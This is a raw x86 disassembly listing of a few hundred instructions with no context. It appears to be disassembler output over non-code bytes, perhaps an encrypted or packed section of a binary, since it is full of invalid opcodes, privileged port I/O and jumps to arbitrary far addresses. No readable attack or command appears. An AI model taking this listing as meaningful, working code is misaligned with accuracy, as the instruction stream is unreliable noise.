  40bbc5:	adc    al,0x39
  40bbc7:	idiv   ebx
  40bbc9:	les    edi,FWORD PTR [ebx]
  40bbcb:	addr16 inc ecx
  40bbcd:	std    
  40bbce:	int    0xcd
  40bbd0:	sub    eax,0x30cd5a63
  40bbd5:	hlt    
  40bbd6:	scas   eax,DWORD PTR es:[edi]
  40bbd7:	adc    al,0x53
  40bbd9:	mov    ebp,0xe3b7ab21
  40bbde:	daa    
  40bbdf:	cmp    ecx,DWORD PTR [edx+0x3d]
  40bbe2:	sub    eax,0x34fb2624
  40bbe7:	inc    ebp
  40bbe8:	inc    ebx
  40bbe9:	mov    al,0x12
  40bbeb:	jno    0x40bbe9
  40bbed:	out    dx,al
  40bbee:	stc    
  40bbef:	cdq    
  40bbf0:	xor    edx,eax
  40bbf2:	and    esi,eax
  40bbf4:	pop    ss
  40bbf5:	add    ch,BYTE PTR [ecx-0x27f5482]
  40bbfb:	adc    al,0x51
  40bbfd:	mul    BYTE PTR [edx-0x328b7d0d]
  40bc03:	out    0x5b,eax
  40bc05:	repz out dx,eax
  40bc07:	repnz mov edi,0x3a36fb0f
  40bc0d:	or     ebp,esp
  40bc0f:	(bad)  
  40bc10:	mov    bl,0xfb
  40bc12:	mov    es,WORD PTR [edi]
  40bc14:	mov    esp,0xa22332f5
  40bc19:	jno    0x40bbe7
  40bc1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc1c:	sbb    BYTE PTR [edi-0x1f],al
  40bc1f:	ins    DWORD PTR es:[edi],dx
  40bc20:	in     al,0xa1
  40bc22:	stos   DWORD PTR es:[edi],eax
  40bc23:	jmp    0x40bc93
  40bc25:	fs mov bl,0x6a
  40bc28:	(bad)  
  40bc2a:	adc    dl,BYTE PTR [ecx-0x66557996]
  40bc30:	test   al,0xb6
  40bc32:	adc    eax,0xc07179c5
  40bc37:	mov    dh,0x74
  40bc39:	out    dx,al
  40bc3a:	adc    al,0x66
  40bc3c:	data16 lock outs dx,BYTE PTR ds:[esi]
  40bc3f:	test   al,0xe0
  40bc41:	bound  esp,QWORD PTR [edx-0x1e3be5ee]
  40bc47:	fdivr  QWORD PTR [ecx-0x7f]
  40bc4a:	mov    dl,BYTE PTR [esi]
  40bc4c:	cmp    al,0xc6
  40bc4e:	xchg   esp,eax
  40bc4f:	(bad)  
  40bc50:	lock adc ah,BYTE PTR [esi+0x4c]
  40bc54:	xchg   esp,eax
  40bc55:	call   0x333d:0x9a99cc6d
  40bc5c:	jmp    0x40bcc3
  40bc5e:	mov    cl,0xc6
  40bc60:	push   ss
  40bc61:	push   esi
  40bc62:	cwde   
  40bc63:	mov    ebx,esp
  40bc65:	sub    ah,BYTE PTR [eax-0x61be2c83]
  40bc6b:	xor    BYTE PTR [edi+edi*1-0x65b84bb6],0xa1
  40bc73:	inc    edi
  40bc74:	add    BYTE PTR [esi+0x47],cl
  40bc77:	repz xchg ebp,eax
  40bc79:	mov    dh,0x6b
  40bc7b:	pop    ebp
  40bc7c:	adc    edx,DWORD PTR [esi-0x14f44fb0]
  40bc82:	fs mov esp,0xdd5ef38f
  40bc88:	cli    
  40bc89:	jmp    0xe8fe232a
  40bc8e:	loop   0x40bca0
  40bc90:	ja     0x40bcd3
  40bc92:	or     BYTE PTR [eax],ah
  40bc94:	into   
  40bc95:	jmp    0xd7c7:0x158275b3
  40bc9c:	or     dl,BYTE PTR [ecx-0x41]
  40bc9f:	xlat   BYTE PTR ds:[ebx]
  40bca0:	aas    
  40bca1:	pop    ebx
  40bca2:	rcr    DWORD PTR [edi-0x42272cd1],0x12
  40bca9:	out    0x86,al
  40bcab:	push   edi
  40bcac:	lock mov ds:0x569b0199,al
  40bcb2:	int3   
  40bcb3:	popf   
  40bcb4:	pop    esp
  40bcb5:	inc    edx
  40bcb6:	test   bl,bl
  40bcb8:	mov    bl,BYTE PTR ds:0x3f904cc7
  40bcbe:	push   ecx
  40bcbf:	add    eax,0xb4653461
  40bcc4:	fimul  DWORD PTR [esi]
  40bcc6:	je     0x40bd30
  40bcc8:	(bad)  
  40bcc9:	stos   DWORD PTR es:[edi],eax
  40bcca:	retf   
  40bccb:	cs dec esp
  40bccd:	leave  
  40bcce:	xor    ebx,DWORD PTR [ecx]
  40bcd0:	xchg   edx,eax
  40bcd1:	adc    eax,0xc90d40e7
  40bcd6:	outs   dx,BYTE PTR ss:[esi]
  40bcd8:	int3   
  40bcd9:	inc    DWORD PTR [esi+ebp*4+0x58653e67]
  40bce0:	mov    esp,0x493567aa
  40bce5:	js     0x40bd41
  40bce7:	jns    0x40bcd6
  40bce9:	mov    eax,ds:0x834f69c6
  40bcee:	xchg   esi,eax
  40bcef:	mov    edx,0x5b0118d4
  40bcf4:	arpl   WORD PTR [ebx-0x36b3d5df],di
  40bcfa:	inc    edx
  40bcfb:	and    al,0x24
  40bcfd:	in     eax,0x76
  40bcff:	jg     0x40bc8e
  40bd01:	push   edi
  40bd02:	xor    al,0xc1
  40bd04:	ds out 0xd5,eax
  40bd07:	(bad)  
  40bd08:	mov    ch,0xe
  40bd0a:	ret    0x3fd1
  40bd0d:	inc    ecx
  40bd0e:	test   bl,dh
  40bd10:	(bad)  
  40bd11:	into   
  40bd12:	loop   0x40bd8a
  40bd14:	fwait
  40bd15:	push   0xffffffce
  40bd17:	jb     0x40bcbc
  40bd19:	cdq    
  40bd1a:	cmp    dl,ah
  40bd1c:	dec    esp
  40bd1d:	mov    DWORD PTR [edi-0x30],esi
  40bd20:	jae    0x40bd59
  40bd22:	push   ebp
  40bd23:	xchg   edx,eax
  40bd24:	add    eax,0x86d6e5e6
  40bd29:	xchg   edx,eax
  40bd2a:	aas    
  40bd2b:	pop    ds
  40bd2c:	or     dl,BYTE PTR [ebx-0x4f2947d5]
  40bd32:	mov    BYTE PTR [edx],bl
  40bd34:	or     ecx,DWORD PTR [edi+ebx*4+0x11]
  40bd38:	out    dx,eax
  40bd39:	(bad)  
  40bd3a:	mov    al,ds:0x638d9e5a
  40bd3f:	inc    esi
  40bd40:	add    BYTE PTR [ecx],bl
  40bd42:	retf   0x6bc2
  40bd45:	sub    BYTE PTR [ebp-0xf],bl
  40bd48:	adc    al,0xf1
  40bd4a:	in     al,dx
  40bd4b:	test   al,0xf6
  40bd4d:	test   DWORD PTR [eax-0x29748581],esi
  40bd53:	ret    
  40bd54:	mov    cl,0x21
  40bd56:	xchg   edx,eax
  40bd57:	sub    al,0xbc
  40bd59:	and    BYTE PTR [edx],al
  40bd5b:	cmp    al,0xf5
  40bd5d:	adc    DWORD PTR ds:0xd47144a4,ebp
  40bd63:	dec    ebp
  40bd64:	mov    ds:0x6ca7db30,eax
  40bd69:	dec    esp
  40bd6a:	pop    ecx
  40bd6b:	sbb    DWORD PTR [eax+0x44],edi
  40bd6e:	sbb    bl,ch
  40bd70:	mov    BYTE PTR [ebx],bl
  40bd72:	iret   
  40bd73:	add    BYTE PTR [ebx-0x5139a3b4],ah
  40bd79:	push   esp
  40bd7a:	aaa    
  40bd7b:	inc    ecx
  40bd7c:	or     DWORD PTR ss:[esi],edi
  40bd7f:	xchg   ebx,eax
  40bd80:	pop    ecx
  40bd81:	add    BYTE PTR [esi],ah
  40bd83:	scas   eax,DWORD PTR es:[edi]
  40bd84:	cmp    BYTE PTR [edi+0x3a1c6af0],bh
  40bd8a:	(bad)  
  40bd8c:	mov    ecx,0xc1df6096
  40bd91:	sbb    BYTE PTR [edi+0x6f066d61],0xa8
  40bd98:	xchg   BYTE PTR [ebx-0x3a0a9e66],dl
  40bd9e:	adc    eax,0xabf620d9
  40bda3:	sti    
  40bda4:	mov    eax,ds:0x6c6a9722
  40bda9:	jle    0x40bd88
  40bdab:	push   cs
  40bdac:	jbe    0x40be2d
  40bdae:	push   edx
  40bdaf:	mov    dl,0x95
  40bdb1:	or     bh,BYTE PTR [eax]
  40bdb3:	sti    
  40bdb4:	pop    ebx
  40bdb5:	pop    eax
  40bdb6:	(bad)  
  40bdb7:	fisub  DWORD PTR [edx-0x5ac85a82]
  40bdbd:	mov    BYTE PTR [esi-0x7585f54b],dh
  40bdc3:	mov    ds:0x709cad5,al
  40bdc8:	test   al,0xd6
  40bdca:	add    BYTE PTR [ecx],dl
  40bdcc:	std    
  40bdcd:	push   ss
  40bdce:	jmp    0xbc0c:0xd836941e
  40bdd5:	jae    0x40be54
  40bdd7:	push   esi
  40bdd8:	aam    0xdc
  40bdda:	and    al,0xdb
  40bddc:	adc    dh,BYTE PTR [ebx-0x53e383b9]
  40bde2:	add    DWORD PTR [edi+0x4eb6e92d],eax
  40bde8:	jno    0x40be43
  40bdea:	(bad)  
  40bdeb:	jo     0x40bdc9
  40bded:	cmc    
  40bdee:	mov    esp,0x1103de64
  40bdf3:	adc    al,0x9d
  40bdf5:	mov    ch,0xda
  40bdf7:	(bad)
  40bdfa:	xor    BYTE PTR [ebx+0x49b3664d],ch
  40be00:	fmul   st(6),st
  40be02:	iret   
  40be03:	test   ch,0xdf
  40be06:	rcl    al,0x6d
  40be09:	xchg   ebx,eax
  40be0a:	out    dx,al
  40be0b:	mov    gs,WORD PTR [ecx+edx*8]
  40be0e:	icebp  
  40be0f:	ret    0xc5b6
  40be12:	mov    edi,0x5fc44194
  40be17:	(bad)  
  40be18:	add    al,0x62
  40be1a:	inc    eax
  40be1b:	cmp    DWORD PTR [esi+0x2e447f12],0x61
  40be22:	mov    bl,dl
  40be24:	popf   
  40be25:	jbe    0x40be96
  40be27:	sub    DWORD PTR [eax+0x5d4c2951],esi
  40be2d:	mov    bl,0xaa
  40be2f:	stos   BYTE PTR es:[edi],al
  40be30:	xchg   ecx,eax
  40be31:	test   al,0xf7
  40be33:	xchg   bh,cl
  40be35:	gs inc ecx
  40be37:	arpl   WORD PTR [eax-0x2ee08f5f],ax
  40be3d:	inc    ebp
  40be3e:	jle    0x40be0d
  40be40:	pop    ebx
  40be41:	mov    esi,0xb051ab66
  40be46:	jle    0x40be79
  40be48:	mov    edx,0xe075c8aa
  40be4d:	or     al,0x16
  40be4f:	inc    esi
  40be50:	push   0x3dcaf85a
  40be55:	cmp    BYTE PTR [ebx+0x7be983ef],ch
  40be5b:	jmp    0xca2e:0x6f3031a9
  40be62:	mov    ah,0xa5
  40be64:	mov    ebx,0xe9843b69
  40be69:	imul   ecx,DWORD PTR [edx],0x28
  40be6c:	out    0x45,al
  40be6e:	push   cs
  40be6f:	int    0x73
  40be71:	ror    DWORD PTR [edx+esi*1-0x1a165e38],1
  40be78:	push   0x7f
  40be7a:	pop    edx
  40be7b:	shl    DWORD PTR [edi-0x33c85a24],0xe5
  40be82:	cli    
  40be83:	sahf   
  40be84:	jp     0x40be47
  40be86:	inc    ebx
  40be87:	add    ecx,edi
  40be89:	mov    al,0x53
  40be8b:	adc    dh,cl
  40be8d:	pop    es
  40be8e:	aam    0x98
  40be90:	and    eax,0xea9eb1c1
  40be95:	fwait
  40be96:	imul   esi,DWORD PTR [edi+0x2ce35b97],0xffffffc9
  40be9d:	scas   eax,DWORD PTR es:[edi]
  40be9e:	(bad)  
  40be9f:	pusha  
  40bea0:	js     0x40be7e
  40bea2:	retf   
  40bea3:	popa   
  40bea4:	outs   dx,DWORD PTR ds:[esi]
  40bea5:	push   ebx
  40bea6:	xchg   esi,eax
  40bea7:	test   DWORD PTR [edi+ecx*4+0x2b],0x436707a3
  40beaf:	sbb    DWORD PTR [edx-0x75],esi
  40beb2:	xor    al,0x1e
  40beb4:	sub    bl,bl
  40beb6:	mov    ds:0xed8d281c,al
  40bebc:	fdivr  QWORD PTR [edi]
  40bebe:	pop    es
  40bebf:	shl    DWORD PTR [ecx-0x44],cl
  40bec2:	mov    edx,0xd29cae3f
  40bec7:	pop    ds
  40bec8:	dec    edi
  40bec9:	xchg   edi,eax
  40beca:	and    eax,0xb65a3f2a
  40becf:	adc    al,0x2a
  40bed1:	inc    ebp
  40bed2:	mov    WORD PTR [edx+ecx*2+0x56a2eff9],cs
  40bed9:	mov    edx,0x6fe88479
  40bede:	mov    ds:0x8947f829,eax
  40bee3:	add    al,0x37
  40bee5:	pop    es
  40bee6:	pop    esp
  40bee7:	adc    al,0xe0
  40bee9:	not    DWORD PTR [eax-0x63]
  40beec:	jno    0x40bf4a
  40beee:	rcr    DWORD PTR [esi+0x3afaa441],1
  40bef4:	mov    ah,0x90
  40bef6:	mov    esi,0x8afd5ae2
  40befb:	xor    edi,DWORD PTR [edi]
  40befd:	pushf  
  40befe:	ins    BYTE PTR es:[edi],dx
  40beff:	icebp  
  40bf00:	int    0x5
  40bf02:	in     al,dx
  40bf03:	add    BYTE PTR ds:0x523817d4,bh
  40bf09:	ficom  DWORD PTR [ebp-0x1cb98030]
  40bf0f:	jns    0x40bf19
  40bf11:	cmc    
  40bf12:	xor    esp,ebx
  40bf14:	cmp    al,0x30
  40bf16:	mov    eax,ds:0x7d090f77
  40bf1b:	mov    ebp,ebx
  40bf1d:	sbb    al,0x3a
  40bf1f:	mov    DWORD PTR [eax],edx
  40bf21:	loope  0x40bed1
  40bf23:	jae    0x40bf70
  40bf25:	add    dl,BYTE PTR [esi-0xa]
  40bf28:	(bad)  
  40bf29:	cmp    dl,BYTE PTR [edx+0x3b]
  40bf2c:	pop    esi
  40bf2d:	(bad)  
  40bf2e:	cmp    eax,0xf2c66507
  40bf33:	and    DWORD PTR [esi],ebp
  40bf35:	mov    al,bl
  40bf37:	sbb    al,0xb5
  40bf39:	and    edx,DWORD PTR [ebp-0x61]
  40bf3c:	call   0x1afb:0xe7a81a42
  40bf43:	arpl   WORD PTR [eax],bx
  40bf45:	xor    BYTE PTR [ecx+0x7d5ae11d],ah
  40bf4b:	clc    
  40bf4c:	cmp    DWORD PTR [esi+0x70],edx
  40bf4f:	daa    
  40bf50:	dec    esi
  40bf51:	test   DWORD PTR [esi+0x415c77ca],0xb0ac531e
  40bf5b:	sub    DWORD PTR [edx-0xed2d01c],edx
  40bf61:	int    0xcf
  40bf63:	out    0x3b,eax
  40bf65:	sub    al,0x6b
  40bf67:	jp     0x40bf08
  40bf69:	pop    ebx
  40bf6a:	jle    0x40bfdd
  40bf6c:	sub    al,0xd7
  40bf6e:	stc    
  40bf6f:	shl    BYTE PTR [esi-0x4c],1
  40bf72:	inc    esp
  40bf73:	jmp    0x7e2e:0x2ed4a020
  40bf7a:	test   eax,0x11cf275e
  40bf7f:	push   eax
  40bf80:	mov    cl,cl
  40bf82:	xchg   DWORD PTR [ecx+0x625cc724],ecx
  40bf88:	imul   eax,DWORD PTR [eax],0x97e65f40
  40bf8e:	mov    al,ds:0x3a03bcbe
  40bf93:	daa    
  40bf94:	sub    eax,0xc73740b3
  40bf99:	xchg   edx,edi
  40bf9b:	mov    eax,0x1592af82
  40bfa0:	out    dx,eax
  40bfa1:	jmp    0x76f8d29d
  40bfa6:	cld    
  40bfa7:	mov    cl,0x24
  40bfa9:	gs iret 
  40bfab:	jmp    0xf31df5d3
  40bfb0:	fstp   DWORD PTR [ecx+0x64a5f19a]
  40bfb6:	hlt    
  40bfb7:	jecxz  0x40c028
  40bfb9:	sar    BYTE PTR [edi-0x3e4cf00c],1
  40bfbf:	(bad)  
  40bfc1:	mov    ss,WORD PTR [esi+0x1f5cf706]
  40bfc7:	push   0xbfad66d6
  40bfcc:	push   es
  40bfcd:	sbb    eax,0x33c7d71c
  40bfd2:	push   ss
  40bfd3:	shl    BYTE PTR [eax-0x4b],cl
  40bfd6:	ins    BYTE PTR es:[edi],dx
  40bfd7:	jge    0x40bffb
  40bfd9:	pop    esp
  40bfda:	mov    dh,0x3c
  40bfdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfdd:	in     al,dx
  40bfde:	jae    0x40bf99
  40bfe0:	cmp    BYTE PTR [ecx],dh
  40bfe2:	mov    gs,WORD PTR [edx-0x6e]
  40bfe5:	sub    esi,DWORD PTR [esp+esi*1+0x52]
  40bfe9:	outs   dx,BYTE PTR ds:[esi]
  40bfea:	vsubpd ymm1,ymm2,YMMWORD PTR [edx]
  40bfee:	jno    0x40bfaa
  40bff0:	fdiv   QWORD PTR [ebx+0x50]
  40bff3:	fdiv   QWORD PTR [ebp-0x39]
  40bff6:	jmp    0x40c032
  40bff8:	(bad)  
  40bff9:	aad    0x47
  40bffb:	jg     0x40bff3
  40bffd:	xor    al,0x9f
  40bfff:	retf   0x1a48
  40c002:	imul   edi,DWORD PTR [eax],0xb3e2a081
  40c008:	lahf   
  40c009:	xchg   ebp,eax
  40c00a:	xchg   ebp,eax
  40c00b:	int    0x85
  40c00d:	pop    eax
  40c00e:	call   0xbdbdeb10
  40c013:	repnz push 0x8339a460
  40c019:	cmp    BYTE PTR [eax],dh
  40c01b:	push   edi
  40c01c:	loopne 0x40bfb4
  40c01e:	aas    
  40c01f:	push   ebp
  40c020:	sbb    cl,BYTE PTR [esi-0x6add24a8]
  40c026:	mul    DWORD PTR [eax-0x40]
  40c029:	sbb    cl,BYTE PTR [esi+0xa]
  40c02c:	pop    ds
  40c02d:	mov    bh,0xea
  40c02f:	jae    0x40c07f
  40c031:	sbb    eax,0x1d739720
  40c036:	not    ch
  40c038:	and    eax,0x4619803d
  40c03d:	push   es
  40c03e:	pusha  
  40c03f:	lea    ebx,[edi+0x0]
  40c042:	adc    al,0xd3
  40c044:	pop    edx
  40c045:	or     al,0x58
  40c047:	jge    0x40c03d
  40c049:	pusha  
  40c04a:	aas    
  40c04b:	mov    esi,0xa86a569e
  40c050:	in     eax,0x75
  40c052:	dec    eax
  40c053:	pop    ebx
  40c054:	and    BYTE PTR [edx+0x6e],0xea
  40c058:	push   es
  40c059:	fisub  DWORD PTR [ebp-0x1de0dc2]
  40c05f:	push   edi
  40c060:	pop    esp
  40c061:	into   
  40c062:	pop    es
  40c063:	jne    0x40c07f
  40c065:	pop    ebp
  40c066:	std    
  40c067:	std    
  40c068:	(bad)  
  40c069:	call   0x5edcd77e
  40c06e:	adc    esp,0x72
  40c071:	pop    edi
  40c072:	pop    ds
  40c073:	ss or  ch,BYTE PTR fs:[edx]
  40c077:	test   BYTE PTR [esi-0x33],0x9e
  40c07b:	push   ss
  40c07c:	or     ebp,eax
  40c07e:	retf   
  40c07f:	aad    0x64
  40c081:	or     bl,BYTE PTR [edx+0x2f]
  40c084:	mov    edx,0xd5f1b1e8
  40c089:	js     0x40c0ce
  40c08b:	int    0x48
  40c08d:	push   ebx
  40c08e:	loope  0x40c045
  40c090:	iret   
  40c091:	sub    edx,0x7d
  40c094:	add    BYTE PTR [ecx+ecx*8-0x23],ch
  40c098:	cmp    ch,bl
  40c09a:	mov    DWORD PTR [edx],ebx
  40c09c:	js     0x40c082
  40c09e:	cmc    
  40c09f:	cmp    eax,0xa3aaaca9
  40c0a4:	mov    cl,0xd2
  40c0a6:	arpl   di,ax
  40c0a8:	jbe    0x40c05d
  40c0aa:	xchg   ebp,eax
  40c0ab:	test   al,0xb1
  40c0ad:	xchg   ebp,eax
  40c0ae:	cmp    ecx,eax
  40c0b0:	rep stos DWORD PTR es:[edi],eax
  40c0b2:	int    0x88
  40c0b4:	scas   eax,DWORD PTR es:[edi]
  40c0b5:	mov    BYTE PTR [esi+0xe],cl
  40c0b8:	das    
  40c0b9:	dec    edx
  40c0ba:	adc    DWORD PTR [esp+eax*4-0x6b],ebp
  40c0be:	pop    es
  40c0bf:	jmp    0x8ca7c4b6
  40c0c4:	stos   BYTE PTR es:[edi],al
  40c0c5:	into   
  40c0c6:	bound  edi,QWORD PTR [edx+edx*1+0x7a]
  40c0ca:	test   DWORD PTR [ecx],ecx
  40c0cc:	pop    edi
  40c0cd:	pushf  
  40c0ce:	mov    ds:0xee4d8ec3,eax
  40c0d3:	adc    eax,DWORD PTR [ecx]
  40c0d5:	mov    al,0x54
  40c0d7:	loop   0x40c0ee
  40c0d9:	sbb    al,0xf0
  40c0db:	int    0x2e
  40c0dd:	in     al,dx
  40c0de:	add    eax,0x1adab187
  40c0e3:	(bad)  
  40c0e4:	test   DWORD PTR [edi+edi*1-0xf],0xa4bad932
  40c0ec:	mov    ss,WORD PTR ds:[ebp-0x51bc7815]
  40c0f3:	popa   
  40c0f4:	fstp   TBYTE PTR [di+0x12]
  40c0f8:	(bad)  
  40c0f9:	jnp    0x40c132
  40c0fb:	in     al,dx
  40c0fc:	fiadd  DWORD PTR [ebx+0x45]
  40c0ff:	test   eax,0x2442935c
  40c104:	outs   dx,BYTE PTR ds:[esi]
  40c105:	sbb    DWORD PTR [edx],0x4d824027
  40c10b:	mov    eax,ds:0x839f78f9
  40c110:	add    eax,0x4edc9ab2
  40c115:	or     al,0x2
  40c117:	lock mov dl,0x92
  40c11a:	dec    ebp
  40c11b:	sbb    ebx,DWORD PTR [esi]
  40c11d:	jne    0x40c13b
  40c11f:	outs   dx,DWORD PTR ds:[esi]
  40c120:	in     eax,dx
  40c121:	addr16 gs ds dec eax
  40c125:	call   0xefb2:0x345bcc13
  40c12c:	aam    0x7d
  40c12e:	mov    WORD PTR [ebp-0x54],?
  40c131:	sub    ebx,DWORD PTR [edx+0x2d0f571d]
  40c137:	sub    al,0x59
  40c139:	mov    ebp,0x6ac490af
  40c13e:	push   ebp
  40c13f:	xor    al,0xa9
  40c141:	add    eax,0x2
  40c144:	lods   al,BYTE PTR ds:[esi]
  40c145:	sti    
  40c146:	dec    edx
  40c147:	popa   
  40c148:	xchg   dl,bh
  40c14a:	and    esi,DWORD PTR [ebx+0xadf09a7]
  40c150:	adc    ah,BYTE PTR [edi]
  40c152:	outs   dx,DWORD PTR ds:[esi]
  40c153:	adc    eax,0x8d41d060
  40c158:	cs mov bl,0x80
  40c15b:	mov    gs,WORD PTR [ebx]
  40c15d:	jp     0x40c155
  40c15f:	cli    
  40c160:	mov    dh,0x9e
  40c162:	js     0x40c16a
  40c164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c165:	or     DWORD PTR [ecx-0x1b],ebx
  40c168:	rcr    DWORD PTR [ebx+0x6a],1
  40c16b:	xor    al,0x98
  40c16d:	xor    DWORD PTR [esi],ecx
  40c16f:	push   cs
  40c170:	inc    edx
  40c171:	mov    ecx,0xa1a1bdde
  40c176:	jmp    0xeb9972ea
  40c17b:	ret    0x8aa8
  40c17e:	rol    BYTE PTR [ebx+0x26ee7cd1],cl
  40c184:	mov    ecx,DWORD PTR [eax]
  40c186:	int    0x23
  40c188:	call   edx
  40c18a:	nop
  40c18b:	pop    es
  40c18c:	rcr    DWORD PTR [edi+ebx*8],1
  40c18f:	inc    ebx
  40c190:	xlat   BYTE PTR ds:[ebx]
  40c191:	push   ecx
  40c192:	cmp    eax,DWORD PTR [esi-0x5973c1ba]
  40c198:	push   ebx
  40c199:	arpl   WORD PTR [ecx+eax*2],si
  40c19c:	es lock loop 0x40c121
  40c1a0:	sub    DWORD PTR [edx-0x2a],ebx
  40c1a3:	push   eax
  40c1a4:	fmul   QWORD PTR gs:[edi+0x5638a3cc]
  40c1ab:	fwait
  40c1ac:	mov    dl,bl
  40c1ae:	cmovle ecx,edx
  40c1b1:	jmp    0x40c1fd
  40c1b3:	inc    edx
  40c1b4:	scas   eax,DWORD PTR es:[edi]
  40c1b5:	mov    DWORD PTR [ecx],eax
  40c1b7:	int3   
  40c1b8:	aam    0x69
  40c1ba:	ret    0x71a9
  40c1bd:	dec    eax
  40c1be:	test   al,0x70
  40c1c0:	jmp    0xbeeff84d
  40c1c5:	dec    esp
  40c1c6:	jmp    0xdc060d86
  40c1cb:	pop    eax
  40c1cc:	call   0x2a17:0xdda7b8bc
  40c1d3:	mov    ch,0xd4
  40c1d5:	mov    al,ds:0x3bca1f30
  40c1da:	cmp    al,0xd2
  40c1dc:	aam    0x3e
  40c1de:	mov    ss,WORD PTR [edi-0x1e]
  40c1e1:	repnz cmp ecx,ebp
  40c1e4:	outs   dx,BYTE PTR ds:[esi]
  40c1e5:	rcl    esp,cl
  40c1e7:	push   esp
  40c1e8:	xchg   ecx,eax
  40c1e9:	ins    BYTE PTR es:[edi],dx
  40c1ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1eb:	rcl    DWORD PTR [edi-0x347c7643],cl
  40c1f1:	fld    DWORD PTR [ecx-0x227dc5ec]
  40c1f7:	sub    BYTE PTR [esi+0x10600d78],0x13
  40c1fe:	loopne 0x40c1f0
  40c200:	stos   DWORD PTR es:[edi],eax
  40c201:	ins    BYTE PTR es:[edi],dx
  40c202:	mov    dl,0xb3
  40c204:	iret   
  40c205:	popa   
  40c206:	add    ecx,0x88eea97a
  40c20c:	mov    ebx,0x2556af67
  40c211:	cmp    dh,dl
  40c213:	enter  0xb794,0x42
  40c217:	push   edi
  40c218:	mov    eax,ds:0xecba73c7
  40c21d:	or     DWORD PTR [edi],edi
  40c21f:	lds    eax,FWORD PTR [edi+0x37]
  40c222:	enter  0x145b,0x1e
  40c226:	in     eax,dx
  40c227:	loopne 0x40c249
  40c229:	add    al,0x90
  40c22b:	jmp    0x60d09e11
  40c230:	push   esp
  40c231:	mov    edx,0x94963022
  40c236:	sub    ebp,DWORD PTR [ebp+0x3d796fe2]
  40c23c:	icebp  
  40c23d:	cmp    dh,bl
  40c23f:	jmp    0x6940:0x5ddfb428
  40c246:	push   0xde341724
  40c24b:	mov    al,0x7e
  40c24d:	jnp    0x40c2c1
  40c24f:	bound  edx,QWORD PTR [ebx-0x39a1fa8b]
  40c255:	jmp    0x1872ba99
  40c25a:	and    bl,BYTE PTR [ebx-0x72]
  40c25d:	inc    edx
  40c25e:	xchg   DWORD PTR [ebx+0x28bd73b0],ebx
  40c264:	into   
  40c265:	mov    esp,0x28cd6f0
  40c26a:	test   al,0x5c
  40c26c:	or     al,0xe1
  40c26e:	iret   
  40c26f:	jge    0x40c247
  40c271:	push   ds
  40c272:	push   es
  40c273:	ins    BYTE PTR es:[edi],dx
  40c274:	out    dx,al
  40c275:	adc    esi,DWORD PTR [edx+0x1b]
  40c278:	in     eax,dx
  40c279:	gs pop esp
  40c27b:	retw   
  40c27d:	xlat   BYTE PTR ds:[ebx]
  40c27e:	stos   BYTE PTR es:[edi],al
  40c27f:	or     BYTE PTR [esp+ecx*1],bh
  40c282:	ins    DWORD PTR es:[edi],dx
  40c283:	inc    esp
  40c284:	stos   BYTE PTR es:[edi],al
  40c285:	jmp    0x8d80e179
  40c28a:	inc    ebp
  40c28b:	ret    0xc208
  40c28e:	jecxz  0x40c25d
  40c290:	retf   
  40c291:	mov    eax,ds:0x16bddd30
  40c296:	mov    fs,WORD PTR [edi+eiz*8]
  40c299:	add    ah,BYTE PTR [edx]
  40c29b:	leave  
  40c29c:	adc    DWORD PTR gs:[edx+ecx*4],edx
  40c2a0:	jnp    0x40c27a
  40c2a2:	aaa    
  40c2a3:	inc    edi
  40c2a4:	push   cs
  40c2a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2a6:	mov    edx,DWORD PTR [ebx]
  40c2a8:	pop    esp
  40c2a9:	inc    eax
  40c2aa:	jge    0x40c27b
  40c2ac:	sub    cl,ch
  40c2ae:	mov    edx,0xc12e0530
  40c2b3:	sbb    eax,0x743dc041
  40c2b8:	add    dh,BYTE PTR fs:[edx+0xd003f49]
  40c2bf:	and    DWORD PTR [esi+0x4fdf1374],0xda58879
  40c2c9:	inc    esi
  40c2ca:	cmc    
  40c2cb:	clc    
  40c2cc:	ror    BYTE PTR [edi+eax*1],0xb
  40c2d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2d1:	mov    cl,BYTE PTR [esi-0x40bea58a]
  40c2d7:	push   es
  40c2d8:	push   edx
  40c2d9:	rol    BYTE PTR [edx+0x24691d76],cl
  40c2df:	push   esp
  40c2e0:	dec    eax
  40c2e1:	shl    DWORD PTR [eax-0x22f07ebb],1
  40c2e7:	leave  
  40c2e8:	or     DWORD PTR [edx+0x68e115a6],0xfffffffd
  40c2ef:	pop    eax
  40c2f0:	into   
  40c2f1:	xor    cl,cl
  40c2f3:	stos   BYTE PTR es:[edi],al
  40c2f4:	fdivr  DWORD PTR [ecx-0x6b849f1b]
  40c2fa:	retf   
  40c2fb:	mov    dl,ah
  40c2fd:	mov    ch,0xfa
  40c2ff:	ins    BYTE PTR es:[edi],dx
  40c300:	cmp    DWORD PTR [ebx],esp
  40c302:	xchg   ebp,eax
  40c303:	or     DWORD PTR [edx-0xd136307],ecx
  40c309:	mov    esp,0xf6fa99d
  40c30e:	icebp  
  40c30f:	es dec edx
  40c311:	mov    bl,0xed
  40c313:	stc    
  40c314:	and    cl,BYTE PTR [ebp+0x3b882dc7]
  40c31a:	sbb    edi,eax
  40c31c:	jns    0x40c2d1
  40c31e:	into   
  40c31f:	sub    BYTE PTR [ebp-0x1b3ce810],0x38
  40c326:	or     eax,0xf2e872c0
  40c32b:	xor    eax,0xc36e96e7
  40c330:	xor    al,0xd5
  40c332:	jo     0x40c383
  40c334:	stc    
  40c335:	xor    ch,bl
  40c337:	add    DWORD PTR [edx],eax
  40c339:	lds    esi,FWORD PTR [ebx-0x5ac85cd8]
  40c33f:	(bad)  
  40c340:	jge    0x40c39a
  40c342:	sbb    BYTE PTR [edi],ah
  40c344:	or     edi,DWORD PTR [ebx-0x7a]
  40c347:	jg     0x40c2d4
  40c349:	adc    cl,BYTE PTR [edi+0x7a]
  40c34c:	(bad)  
  40c34d:	add    al,BYTE PTR [ebx]
  40c34f:	fidivr DWORD PTR [edi+0x1]
  40c352:	(bad)  
  40c354:	outs   dx,DWORD PTR ds:[esi]
  40c355:	sub    al,0xbc
  40c357:	retf   
  40c358:	xlat   BYTE PTR ds:[ebx]
  40c359:	scas   al,BYTE PTR es:[edi]
  40c35a:	mov    BYTE PTR [edi],ah
  40c35c:	sub    eax,0x7b1cab46
  40c361:	xchg   ebx,eax
